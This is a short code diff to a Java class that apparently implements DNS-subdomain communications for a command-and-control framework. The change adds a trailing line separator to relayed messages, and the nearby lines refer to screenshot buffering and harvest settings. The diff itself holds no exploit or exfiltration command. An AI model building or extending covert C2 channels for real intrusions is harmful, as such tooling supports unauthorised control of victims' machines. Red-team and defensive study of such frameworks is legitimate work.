@@ -351,6 +351,9 @@ public class DNSEmulatorSubdomainComms extends C2Interface {
 										properties.getProperty(Constants.DAEMONLZHARVEST));
 								screenshotBuffer = "";
 							} else if (!message.contentEquals("<poll>")) {
+								if(!message.endsWith(Constants.NEWLINE)) {
+									message = message + System.lineSeparator();
+								}
 								io.sendIO(sessionId, message);
 							}
 						}
